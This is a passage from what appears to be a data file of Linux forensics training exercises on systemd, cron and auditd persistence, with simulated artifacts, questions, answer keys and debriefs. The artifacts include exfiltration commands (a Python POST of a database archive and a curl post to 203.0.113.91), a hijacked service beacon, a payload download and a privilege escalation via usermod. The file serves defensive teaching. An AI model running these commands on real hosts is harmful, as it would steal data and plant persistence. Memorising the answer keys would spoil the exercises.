        bytes: utf8(
          [
            "# systemctl cat telemetry-agent.service",
            "# /usr/lib/systemd/system/telemetry-agent.service",
            "[Unit]",
            "Description=Telemetry Agent (vendor)",
            "After=network-online.target",
            "Wants=network-online.target",
            "",
            "[Service]",
            "Type=simple",
            "User=telemetry",
            "Group=telemetry",
            "ExecStart=/usr/local/telemetry/bin/agent --config /etc/telemetry/agent.yml",
            "Restart=on-failure",
            "RestartSec=15s",
            "",
            "[Install]",
            "WantedBy=multi-user.target",
            "",
            "# /etc/systemd/system/telemetry-agent.service.d/override.conf",
            "[Service]",
            "User=dbops",
            "ExecStart=",
            "ExecStart=/usr/bin/python3 /home/dbops/.cache/heartbeat/agent.py --beacon https://203.0.113.91/ingest",
            "Environment=HEARTBEAT_SECRET=eyJh...redacted...",
            "",
            "# systemctl cat sync-cleanup.timer  (user unit, --user dbops)",
            "# /home/dbops/.config/systemd/user/sync-cleanup.timer",
            "[Unit]",
            "Description=Sync cleanup",
            "",
            "[Timer]",
            "OnBootSec=2min",
            "OnUnitActiveSec=10min",
            "Unit=sync-cleanup.service",
            "",
            "[Install]",
            "WantedBy=timers.target",
            "",
            "# systemctl cat sync-cleanup.service  (user unit, --user dbops)",
            "# /home/dbops/.config/systemd/user/sync-cleanup.service",
            "[Unit]",
            "Description=Sync cleanup",
            "",
            "[Service]",
            "Type=oneshot",
            "ExecStart=/usr/bin/python3 -c 'import urllib.request,os; urllib.request.urlopen(\"https://203.0.113.91/sync\", data=open(\"/var/lib/mysql-replica/audit.tar\",\"rb\").read())'",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 5,
        displayName: "journalctl-suspect-window.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# journalctl -u telemetry-agent.service --since '2026-10-11 23:00' --until '2026-10-14 00:00'",
            "Oct 11 23:18:02 db-replica-02 systemd[1]: Reloading.",
            "Oct 11 23:18:02 db-replica-02 systemd[1]: Reloaded /etc/systemd/system/telemetry-agent.service.d/override.conf",
            "Oct 11 23:18:02 db-replica-02 systemd[1]: Stopping telemetry-agent.service - Telemetry Agent (vendor)...",
            "Oct 11 23:18:03 db-replica-02 systemd[1]: telemetry-agent.service: Deactivated successfully.",
            "Oct 11 23:18:03 db-replica-02 systemd[1]: Stopped telemetry-agent.service - Telemetry Agent (vendor).",
            "Oct 11 23:18:03 db-replica-02 systemd[1]: Started telemetry-agent.service - Telemetry Agent (vendor).",
            "Oct 11 23:18:03 db-replica-02 python3[24011]: heartbeat start, beacon https://203.0.113.91/ingest",
            "Oct 12 00:18:03 db-replica-02 python3[24011]: heartbeat tick (3600 s)",
            "Oct 13 12:18:03 db-replica-02 python3[24011]: heartbeat tick (3600 s)",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 6,
        displayName: "host-context.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              host: "db-replica-02",
              os: "Rocky Linux 9.4",
              timezone: "UTC",
              acquired_utc: "2026-10-14T09:00:00Z",
              suspect_user: {
                user: "dbops",
                uid: 1700,
                shell: "/bin/bash",
                linger: true,
                note: "linger=true means systemd --user instance for dbops stays running across logout, so user units fire whether or not dbops is interactively logged in.",
              },
              egress_baseline: {
                normal_avg_per_day_bytes: 220000000,
                last_3_days_avg_per_day_bytes: 880000000,
                jumped_on_utc: "2026-10-11T23:18:00Z",
              },
              note: "Vendor telemetry-agent unit was installed Sep 28; drop-in override.conf appeared Oct 11 23:18 alongside the egress increase. User-unit pair under /home/dbops/.config/systemd/user/ also dated Oct 12.",
            },
            null,
            2,
          ) + "\n",
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "From the unit inventory, drop-in, timer list, and journal excerpt, which statements about **what actually runs on this host** are **proven**?",
        options: [
          {
            id: "vendor-agent-hijacked",
            label:
              "The vendor `telemetry-agent.service` was hijacked at `2026-10-11T23:18Z` by a drop-in that replaced `User=` and `ExecStart=` to run a Python beacon to `203.0.113.91` as `dbops`.",
          },
          {
            id: "user-timer-exfil",
            label:
              "A per-user `sync-cleanup.timer` for `dbops` (linger=true) fires `sync-cleanup.service` every 10 minutes after a 2-minute initial delay; the service POSTs `/var/lib/mysql-replica/audit.tar` to `https://203.0.113.91/sync`.",
          },
          {
            id: "vendor-files-modified",
            label:
              "The vendor unit file at `/usr/lib/systemd/system/telemetry-agent.service` was modified in place to point at the Python beacon; the override at `/etc/systemd/system/.../override.conf` is a fingerprint of edits to the underlying vendor file.",
          },
          {
            id: "user-unit-needs-login",
            label:
              "The `sync-cleanup` user unit can only run while `dbops` is interactively logged in; user units are tied to login sessions and are torn down on logout, so an empty `last dbops` output for a window would prove the unit did not fire in that window.",
          },
          {
            id: "telemetry-agent-stopped",
            label:
              "`telemetry-agent.service` stopped running entirely on Oct 11 23:18 — the journal `Stopped telemetry-agent.service` line shows the service was decommissioned and the immediately following `Started` line is unrelated start-of-day reporting from a different unit.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["vendor-agent-hijacked", "user-timer-exfil"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven:**",
          "",
          "- The drop-in at `/etc/systemd/system/telemetry-agent.service.d/override.conf` clears the inherited `ExecStart=` and re-sets it to a Python beacon, plus changes `User=` to `dbops`. `systemctl cat` is the effective merged config — that's what the system runs.",
          "- The user-unit pair under `/home/dbops/.config/systemd/user/` is a valid timer + oneshot. `host-context.json` confirms `linger=true` for `dbops`, so the timer fires regardless of interactive login.",
          "",
          "**Not proven:**",
          "",
          "- *Vendor file modified in place* — the drop-in mechanism leaves the vendor file untouched. That's the whole point. There is no evidence in the artifacts of an edit to `/usr/lib/systemd/system/telemetry-agent.service`.",
          "- *Need to be logged in* — `linger=true` is documented in the host context; user units run while linger is enabled.",
          "- *Service decommissioned* — the `Stopped` line is followed within one second by `Started` on the same unit, which is how systemd applies a drop-in reload.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which **single** systemd command would you run on a live system to most reliably show *the effective ExecStart and User for every unit, including drop-in overrides*?",
        options: [
          {
            id: "systemctl-cat-all",
            label:
              "`systemctl cat <unit>` for each unit (`systemctl cat \\*.service` or a script loop). It prints the parent unit and all drop-in fragments in load order — that's the effective merged config.",
          },
          {
            id: "ls-etc-systemd",
            label:
              "`ls -laR /etc/systemd/system/` — lists every file under the operator-installed unit tree, including drop-in directories, which is sufficient to read the effective configuration from the directory listing alone.",
          },
          {
            id: "systemctl-list-units",
            label:
              "`systemctl list-units --type=service` — lists every loaded unit with its description, which gives you the effective configuration view that drop-ins resolve into during boot.",
          },
          {
            id: "find-execstart",
            label:
              "`grep -R '^ExecStart=' /usr/lib/systemd/system/` — every effective unit comes from this directory because vendor unit files are loaded first, so this captures the full set of running ExecStart lines.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["systemctl-cat-all"],
          allowMultiple: false,
        },
        debriefMd:
          "`systemctl cat` is the canonical way to see the effective merged config (vendor + drop-ins + operator overrides). `ls`-style listings miss the merge; `list-units` shows state, not config; greps of `/usr/lib/systemd/system/` miss `/etc/`, `/run/`, drop-ins, and user units entirely. `systemd-delta` is a useful companion to flag overridden units.",
      },
      {
        ordinal: 3,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which corroborating evidence best confirms the **beacon to `203.0.113.91`** is actually transmitting (not just configured)?",
        options: [
          {
            id: "conntrack",
            label:
              "Live `conntrack` / `ss -tnp` snapshots showing a python3 process under uid 1700 with an ESTABLISHED connection to `203.0.113.91`.",
          },
          {
            id: "netflow",
            label:
              "Upstream NetFlow / VPC flow logs for `db-replica-02`'s NIC IP showing bytes to `203.0.113.91/32` matching the 4× baseline jump.",
          },
          {
            id: "auditd-connect",
            label:
              "auditd `connect` syscall records keyed to the python3 PID under uid 1700.",
          },
          {
            id: "journalctl-tick",
            label:
              "The `python3[24011]: heartbeat tick` lines in `journalctl -u telemetry-agent.service` (the unit is logging its own ticks).",
          },
          {
            id: "iptables-rules",
            label:
              "The current `iptables -L OUTPUT` policy (the ruleset describes what is allowed, not what was sent, so it is not transmission evidence).",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["conntrack", "netflow", "auditd-connect", "journalctl-tick"],
          allowMultiple: true,
        },
        debriefMd: [
          "Live network state (`conntrack`, `ss`), upstream flow records, syscall-level evidence (auditd `connect`), and the unit's own stdout/journal output all independently demonstrate transmission. ",
          "",
          "`iptables -L` shows policy, not traffic. The packet counters (`-v`) would show *something* but are cumulative-since-boot and aren't keyed to destination unless explicit rules exist.",
        ].join("\n"),
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the operator who installed the drop-in is the same human who owns the `dbops` account, based ONLY on these artifacts.",
        expected: { type: "confidence", expectedRange: [1, 2] },
        debriefMd:
          "**1–2.** The drop-in file is owned by `root`; nothing in the artifacts ties its creation to a specific human. Either someone with root installed it (which could be anyone in the sudoers group), or a process running as root did. The user-unit files under `/home/dbops/` are at least in `dbops`'s namespace — but that just means *something* writing as `dbops` (which includes a process started by root running as `dbops`) put them there. Attribution to a human needs auth.log SSH sessions, sudo log entries, and ideally a shell history correlation.",
      },
    ],
  },

  // ─── Difficulty 3 — single-artifact deep dive ────────────────
  {
    slug: "linux-cron-persistence-system-user-001",
    title: "Linux cron: System Crontab vs User Crontabs vs cron.d",
    summary:
      "cron entries hide in five different places, each with subtly different run-as semantics. Read a complete cron inventory and report what runs, when, as which user.",
    skillAreas: ["df_artifacts", "linux_artifacts", "inference_discipline"],
    difficulty: 3,
    estimatedMinutes: 25,
    tags: ["dfir", "linux", "linux_artifacts", "df_artifacts", "persistence", "inference_discipline"],
    lane: "linux_forensics",
    module: "Linux host triage",
    sequence: 4,
    brief: `
# Brief

\`app-04\` (Ubuntu 22.04) is on the watch-list because a
process accounting check showed \`curl\` running as
\`www-data\` at off-hours when no humans were logged in. cron
is the obvious suspect. You have a full cron inventory plus the
\`/var/log/syslog\` entries from \`cron\` for the past 48
hours.

## Where cron entries live

- **\`/etc/crontab\`** — system-wide schedule. Fields are
  \`min hour dom month dow USER command\`. The **user**
  column is what makes this distinct from user crontabs.
- **\`/etc/cron.d/*\`** — per-package or per-operator drop-in
  files. Same six-column format as \`/etc/crontab\`.
- **\`/etc/cron.{hourly,daily,weekly,monthly}/\`** —
  script directories executed by anacron / cron at fixed
  intervals. Scripts here run as \`root\` unless the script
  itself drops privilege.
- **\`/var/spool/cron/crontabs/<user>\`** — per-user crontab,
  five-column format (no user column). The crontab runs as
  \`<user>\` because it's read from that user's spool file.
- **systemd timers** (out of scope here, covered separately).

## Common traps

- **User column matters.** A line in
  \`/etc/cron.d/anything\` without the user column is a
  syntax error; cron logs an error and *does not* fall back
  to root.
- **Anacron and cron interact.** On desktop-style setups,
  anacron handles the daily / weekly / monthly directories.
  Server setups may run them straight from cron. The
  \`/etc/cron.daily/\` set runs in some shell as root either
  way.
- **\`@reboot\`** in a user crontab fires once at boot and
  drops a persistent process — easy to miss in
  \`crontab -l\` output if you don't look at the line type.
- **Editing in place vs replacing.** \`crontab -e\` writes to
  the spool file with a fresh ctime; a quiet operator who
  edits the spool file directly (with root) skips the
  validation step and may leave a malformed entry.
- **DOW / DOM are OR'd** when both are restricted (POSIX
  behaviour). Reading them as AND can lead to wrong
  "this would have fired" claims.

## Artifacts

- **etc-crontab.txt** — \`/etc/crontab\`.
- **etc-cron-d-listing.txt** — \`ls -la /etc/cron.d/\` plus
  the file contents.
- **user-crontabs.txt** — \`/var/spool/cron/crontabs/\`
  listing plus per-user \`crontab -l\` output.
- **cron-syslog-window.txt** — \`grep CRON /var/log/syslog\`
  for the 48-hour window of interest.
- **host-context.json** — distro, anacron-vs-cron config,
  account list.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "etc-crontab.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# /etc/crontab: system-wide crontab",
            "SHELL=/bin/sh",
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
            "",
            "# m h dom mon dow user  command",
            "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly",
            "25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
            "47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )",
            "52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "etc-cron-d-listing.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# ls -la /etc/cron.d/",
            "total 24",
            "drwxr-xr-x.  2 root root 4096 Oct 12 23:02 .",
            "drwxr-xr-x. 96 root root 4096 Oct 12 23:02 ..",
            "-rw-r--r--.  1 root root  120 May 14 09:11 e2scrub_all",
            "-rw-r--r--.  1 root root  102 Aug 02 10:33 logrotate",
            "-rw-r--r--.  1 root root  142 Oct 12 23:02 sync-helper",
            "",
            "# cat /etc/cron.d/sync-helper",
            "SHELL=/bin/sh",
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
            "*/15 * * * *  www-data  curl -sS https://203.0.113.91/sync -d @/var/cache/app/queue.json",
            "",
            "# cat /etc/cron.d/logrotate",
            "# /etc/cron.d/logrotate: invoke logrotate every hour",
            "9 * * * *  root  test -x /usr/sbin/logrotate && /usr/sbin/logrotate /etc/logrotate.conf",
            "",
            "# cat /etc/cron.d/e2scrub_all",
            "# /etc/cron.d/e2scrub_all: scrub ext4 fs metadata weekly",
            "30 03 * * 1  root  test -x /usr/sbin/e2scrub_all && /usr/sbin/e2scrub_all",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "user-crontabs.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# ls -la /var/spool/cron/crontabs/",
            "total 12",
            "drwx-wx--T. 2 root crontab 4096 Oct 12 23:11 .",
            "drwxr-xr-x. 5 root root    4096 Aug 04 14:55 ..",
            "-rw-------. 1 backup crontab  103 Aug 04 15:01 backup",
            "-rw-------. 1 deploy crontab  191 Oct 12 23:11 deploy",
            "",
            "# crontab -l -u backup",
            "@daily  /usr/local/bin/run-backup.sh",
            "",
            "# crontab -l -u deploy",
            "@reboot  nohup /home/deploy/.local/bin/notifier --listen 127.0.0.1:7777 >/dev/null 2>&1 &",
            "*/5 * * * *  /usr/bin/curl -fsS http://127.0.0.1:7777/poll || true",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 4,
        displayName: "cron-syslog-window.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# grep CRON /var/log/syslog (Oct 12 22:00 → Oct 14 09:00 UTC; excerpt)",
            "Oct 12 23:11:02 app-04 crontab[3801]: (deploy) REPLACE (deploy)",
            "Oct 12 23:11:02 app-04 crontab[3801]: (deploy) END EDIT (deploy)",
            "Oct 12 23:15:01 app-04 CRON[3911]: (www-data) CMD (curl -sS https://203.0.113.91/sync -d @/var/cache/app/queue.json)",
            "Oct 12 23:30:01 app-04 CRON[3982]: (www-data) CMD (curl -sS https://203.0.113.91/sync -d @/var/cache/app/queue.json)",
            "Oct 13 00:00:01 app-04 CRON[4055]: (deploy) CMD (/usr/bin/curl -fsS http://127.0.0.1:7777/poll || true)",
            "Oct 13 06:25:01 app-04 CRON[5188]: (root) CMD ( test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))",
            "Oct 14 03:30:01 app-04 CRON[7320]: (root) CMD ( test -x /usr/sbin/e2scrub_all && /usr/sbin/e2scrub_all)",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 5,
        displayName: "host-context.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              host: "app-04",
              os: "Ubuntu 22.04.4 LTS",
              timezone: "UTC",
              acquired_utc: "2026-10-14T09:00:00Z",
              anacron_present: false,
              cron_pkg: "cron (3.0pl1-137ubuntu3)",
              accounts_of_interest: [
                { user: "www-data", uid: 33, shell: "/usr/sbin/nologin", note: "Web server runtime user." },
                { user: "deploy", uid: 1101, shell: "/bin/bash", note: "Deploy automation account; should not log in interactively." },
                { user: "backup", uid: 1102, shell: "/bin/bash", note: "Nightly backup driver." },
              ],
              note: "Anacron is NOT installed. The /etc/crontab guards (test -x /usr/sbin/anacron || ...) fall through, so cron itself runs the cron.daily / weekly / monthly directories.",
            },
            null,
            2,
          ) + "\n",
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "From the cron inventory + the syslog window, which statements about **what actually ran** are **proven**?",
        options: [
          {
            id: "www-data-curl",
            label:
              "`www-data` ran `curl -sS https://203.0.113.91/sync -d @/var/cache/app/queue.json` every 15 minutes, driven by `/etc/cron.d/sync-helper`, with each invocation logged as a `(www-data) CMD` line in syslog.",
          },
          {
            id: "deploy-reboot-listener",
            label:
              "`deploy`'s crontab has an `@reboot` line that starts a local listener on `127.0.0.1:7777`; whether it is currently running depends on whether the host has booted since `Oct 12 23:11` (when the crontab was replaced).",
          },
          {
            id: "deploy-poll-running",
            label:
              "`deploy`'s `*/5` poll line ran successfully at `Oct 13 00:00:01` and every five minutes since, because cron logged `(deploy) CMD ... poll` and `curl -fsS` only returns success on a 2xx response, so each log line proves a successful poll.",
          },
          {
            id: "cron-daily-anacron",
            label:
              "`anacron` ran `/etc/cron.daily` at `06:25:01 UTC`; the `(root) CMD` entry at that time is anacron's wrapper invocation, which is how the daily set is dispatched on this host per the standard Debian-family configuration.",
          },
          {
            id: "e2scrub-ran",
            label:
              "`e2scrub_all` ran at `Oct 14 03:30:01 UTC` driven by `/etc/cron.d/e2scrub_all`.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["www-data-curl", "deploy-reboot-listener", "e2scrub-ran"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven:**",
          "",
          "- `/etc/cron.d/sync-helper` ran as `www-data` every 15 min, with `(www-data) CMD` lines in syslog matching.",
          "- `deploy`'s `@reboot` line is in the crontab and the file was replaced at Oct 12 23:11. Whether the listener is *currently* running depends on whether the host has rebooted since.",
          "- `(root) CMD ... e2scrub_all` matches the `/etc/cron.d/e2scrub_all` schedule (Mon 03:30) — Oct 14 was a Monday.",
          "",
          "**Not proven:**",
          "",
          "- *poll succeeded* — syslog records the *invocation* (`CMD`), not the exit status. `|| true` even masks failures from cron's perspective.",
          "- *anacron ran* — the host context says `anacron_present: false`. The 06:25 line is the `/etc/crontab` fallback running `cron.daily` directly, *because* `test -x /usr/sbin/anacron` failed.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Suppose `/etc/cron.d/sync-helper` had an entry missing the **user column** (five fields instead of six). What would cron do?",
        options: [
          {
            id: "run-as-root",
            label:
              "Default to running it as `root`, because `/etc/cron.d/` lives under `/etc/` and entries that omit the user column inherit the daemon's effective UID (root) at run time on every common distro.",
          },
          {
            id: "log-and-skip",
            label:
              "Log a parse error and skip the line; cron will not silently substitute a user.",
          },
          {
            id: "run-as-file-owner",
            label:
              "Run as the owner of the file (the file is owned by `root`, so functionally root), because cron resolves the file ownership when the user column is omitted and uses that UID for execution.",
          },
          {
            id: "promote-to-spool",
            label:
              "Reject the file on load and promote it to `/var/spool/cron/crontabs/root` after appending a `root` user column automatically, then run the entry as the inserted user from the spool location.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["log-and-skip"],
          allowMultiple: false,
        },
        debriefMd:
          "`/etc/crontab` and `/etc/cron.d/*` require the user column (six fields). A line missing it is a syntax error: cron writes an error to syslog and ignores the line. There is no automatic fallback to root or to file owner. Spool files (`/var/spool/cron/crontabs/<user>`) are the five-field format because the user is already implied by the filename.",
      },
      {
        ordinal: 3,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which corroborating sources would best confirm the `www-data` curl actually transmitted to `203.0.113.91`?",
        options: [
          { id: "auditd-connect", label: "auditd `connect` syscall records for curl under uid 33 with destination `203.0.113.91`." },
          { id: "netflow", label: "Upstream NetFlow / VPC flow logs from `app-04`'s NIC IP to `203.0.113.91/32`." },
          { id: "ss-conntrack", label: "Live `ss -tnp` / `conntrack` capture for the cron-launched curl PIDs." },
          { id: "process-accounting", label: "Linux process accounting (`acct`) records for `curl` invocations under uid 33." },
          { id: "ls-of-queue", label: "`ls -la /var/cache/app/queue.json` (just the file timestamp — proves the input existed but not that anything left the host)." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["auditd-connect", "netflow", "ss-conntrack", "process-accounting"],
          allowMultiple: true,
        },
        debriefMd: [
          "auditd, NetFlow, and live socket state independently corroborate transmission. Process accounting confirms curl ran but stops short of destination evidence.",
          "",
          "An `ls -la` of the input file shows mtime/atime but says nothing about a successful POST.",
        ].join("\n"),
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the operator who created `/etc/cron.d/sync-helper` and `deploy`'s replaced crontab is the **same** person, based ONLY on these artifacts.",
        expected: { type: "confidence", expectedRange: [1, 3] },
        debriefMd:
          "**1–3.** Both changes are dated Oct 12 within a 9-minute window, both files end up owned by root, and both lines stage outbound activity. That's suggestive — clustering and same-day timing — but anyone with root could install `/etc/cron.d/sync-helper`, and `deploy`'s crontab replacement was logged as `(deploy) REPLACE` which is the standard `crontab -e` audit trail (could be run by `deploy` directly or by root via `crontab -u deploy -e`). Without an auth.log SSH session + sudo log, attribution to a single person is a 2–3 confidence call. Reserve 4–5 for a corroborated identity.",
      },
    ],
  },

  // ─── Difficulty 4 — multi-artifact reconciliation ────────────
  {
    slug: "linux-auditd-syscall-evidence-001",
    title: "Linux auditd: Reading execve, connect, and the Rules That Got You Here",
    summary:
      "auditd captures syscall-level evidence — but only of what the loaded rules cover. Read an execve+connect trace cleanly and notice the holes the ruleset leaves.",
    skillAreas: [
      "df_artifacts",
      "linux_artifacts",
      "network_logs",
      "inference_discipline",
    ],
    difficulty: 4,
    estimatedMinutes: 40,
    tags: [
      "dfir",
      "linux",
      "linux_artifacts",
      "df_artifacts",
      "network_logs",
      "inference_discipline",
    ],
    lane: "linux_forensics",
    module: "Linux host triage",
    sequence: 5,
    brief: `
# Brief

\`build-12\` (RHEL 9) had a brief outbound spike that fell back
to baseline within ten minutes. EDR was off. auditd was
configured per the unit's hardening baseline (the rules file is
in the artifacts). The on-call analyst pulled
\`ausearch -i\` over the suspect window plus the loaded rules
and a process tree from \`/proc\`-walk evidence taken minutes
later. Your job: read auditd without trusting it more than it
deserves.

## What auditd records

auditd is a kernel feature exposed via the audit netlink
socket. Rules (\`auditctl -l\`, persistent in
\`/etc/audit/rules.d/\`) tell the kernel which syscalls or
file events to emit. Only matching events are recorded.

## What \`ausearch -i\` gives you

\`-i\` interprets numeric fields: \`uid=1500\` becomes
\`uid=devops\`, \`syscall=59\` becomes \`syscall=execve\`,
\`addr=\\x...\` becomes a printable IP. Multiple records
(\`type=SYSCALL\`, \`type=EXECVE\`, \`type=CWD\`,
\`type=PATH\`, etc.) share an \`audit(<epoch>:<serial>)\`
key so you can reassemble one event.

## Common traps

- **Rules gate everything.** \`-a exit,never\` lines (a
  default first match in some hardening templates) silently
  drop matches. \`auditctl -l\` is your map; what's not in
  the map didn't get logged.
- **execve is captured per syscall, not per child of fork.**
  A binary executed via \`fork()\` then \`exec()\` shows the
  \`execve\` event; pure forks without exec don't.
- **\`auid\`/\`loginuid\` is the audit-login UID set at SSH
  login.** It survives setuid / setgid and \`su\`. A
  \`uid=0\` row with \`auid=1500\` was a privilege-elevated
  action attributable upstream to UID 1500's login session
  (often the strongest attribution Linux offers).
- **\`success=no\` is not an error to ignore.** A failed
  syscall can still be the evidence you need (a thwarted
  connect or open is itself a fingerprint).
- **PID reuse.** A long enough window can wrap PIDs. Use
  \`audit\` keys and \`auid\` rather than raw PID for
  cross-event correlation.

## Artifacts

- **auditd-rules-loaded.txt** — output of \`auditctl -l\`
  (rules in force at acquisition time).
- **ausearch-suspect-window.txt** — \`ausearch -i\` for the
  suspect 10-minute window.
- **proc-tree-snapshot.txt** — \`ps -ef --forest\` taken at
  capture (live snapshot of running processes for cross-ref).
- **host-context.json** — distro, audit framework versions,
  notable rule-template provenance.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "auditd-rules-loaded.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# auditctl -l (build-12, ts 2026-10-14T08:55:00Z)",
            "-a always,exit -F arch=b64 -S execve",
            "-a always,exit -F arch=b32 -S execve",
            "-a always,exit -F arch=b64 -S connect -F a2!=110",
            "-w /etc/passwd -p wa -k identity",
            "-w /etc/shadow -p wa -k identity",
            "-w /etc/sudoers -p wa -k identity",
            "-w /etc/sudoers.d/ -p wa -k identity",
            "-a never,exit -F arch=b64 -S execve -F path=/usr/bin/grep",
            "",
            "# Notes on this ruleset (operator commentary):",
            "#  - execve is captured for every binary EXCEPT /usr/bin/grep",
            "#    (the 'never' rule above shadows the always rules for that one path).",
            "#  - connect is captured for AF_INET / AF_INET6 but not AF_UNIX",
            "#    (a2 is the addrlen; AF_UNIX socket addr length is 110).",
            "#  - File watches fire only on write+attr changes (-p wa) for the listed paths.",
            "#  - No -w /tmp watch; activity in /tmp is invisible unless it triggers execve / connect.",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "ausearch-suspect-window.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# ausearch -i --start 'today 02:40:00' --end 'today 02:55:00' (build-12, TZ=UTC)",
            "----",
            "type=SYSCALL msg=audit(2026-10-14 02:41:18.221:88301): arch=x86_64 syscall=execve success=yes exit=0 a0=0x55... a1=0x55... a2=0x55... ppid=24011 pid=24090 auid=devops uid=devops gid=devops euid=devops suid=devops fsuid=devops egid=devops sgid=devops fsgid=devops tty=pts0 ses=14 comm=bash exe=/usr/bin/bash key=(null)",
            "type=EXECVE msg=audit(2026-10-14 02:41:18.221:88301): argc=4 a0=bash a1=-c a2=curl -fsS https://203.0.113.91/payload -o /tmp/x a3=",
            "type=CWD msg=audit(2026-10-14 02:41:18.221:88301): cwd=/home/devops",
            "type=PATH msg=audit(2026-10-14 02:41:18.221:88301): item=0 name=/usr/bin/bash inode=18802 dev=fd:00 mode=file,755 ouid=root ogid=root",
            "----",
            "type=SYSCALL msg=audit(2026-10-14 02:41:18.640:88305): arch=x86_64 syscall=execve success=yes exit=0 ppid=24090 pid=24091 auid=devops uid=devops gid=devops euid=devops tty=pts0 ses=14 comm=curl exe=/usr/bin/curl key=(null)",
            "type=EXECVE msg=audit(2026-10-14 02:41:18.640:88305): argc=6 a0=curl a1=-fsS a2=https://203.0.113.91/payload a3=-o a4=/tmp/x",
            "type=PATH msg=audit(2026-10-14 02:41:18.640:88305): item=0 name=/usr/bin/curl inode=18900 dev=fd:00 mode=file,755 ouid=root ogid=root",
            "----",
            "type=SYSCALL msg=audit(2026-10-14 02:41:19.011:88312): arch=x86_64 syscall=connect success=yes exit=0 a2=16 ppid=24090 pid=24091 auid=devops uid=devops gid=devops euid=devops tty=pts0 ses=14 comm=curl exe=/usr/bin/curl",
            "type=SOCKADDR msg=audit(2026-10-14 02:41:19.011:88312): saddr=02 00 01 BB CB 00 71 5B 00 00 00 00 00 00 00 00",
            "----",
            "type=SYSCALL msg=audit(2026-10-14 02:43:02.554:88410): arch=x86_64 syscall=execve success=yes exit=0 ppid=24090 pid=24201 auid=devops uid=devops gid=devops euid=root suid=root tty=pts0 ses=14 comm=sudo exe=/usr/bin/sudo",
            "type=EXECVE msg=audit(2026-10-14 02:43:02.554:88410): argc=3 a0=sudo a1=-n a2=/usr/sbin/usermod -aG wheel devops",
            "type=PATH msg=audit(2026-10-14 02:43:02.554:88410): item=0 name=/usr/bin/sudo inode=18420 dev=fd:00 mode=file,4755 ouid=root ogid=root",
            "----",
            "type=SYSCALL msg=audit(2026-10-14 02:43:02.601:88411): arch=x86_64 syscall=execve success=yes exit=0 ppid=24201 pid=24202 auid=devops uid=root gid=root euid=root suid=root tty=pts0 ses=14 comm=usermod exe=/usr/sbin/usermod",
            "type=EXECVE msg=audit(2026-10-14 02:43:02.601:88411): argc=4 a0=/usr/sbin/usermod a1=-aG a2=wheel a3=devops",
            "----",
            "type=CONFIG_CHANGE msg=audit(2026-10-14 02:43:02.601:88412): auid=devops ses=14 op=add_user_to_group acct=devops new_group=wheel res=success",
            "type=USER_MGMT msg=audit(2026-10-14 02:43:02.601:88413): pid=24202 uid=root auid=devops ses=14 msg='op=add_user_to_group acct=devops grp=wheel exe=/usr/sbin/usermod hostname=build-12 res=success'",
            "----",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "proc-tree-snapshot.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# ps -ef --forest (build-12, ts 2026-10-14T02:55:00Z; excerpt)",
            "UID         PID   PPID  C STIME TTY          TIME CMD",
            "root          1      0  0 Sep28 ?        00:01:18 /usr/lib/systemd/systemd --switched-root --system",
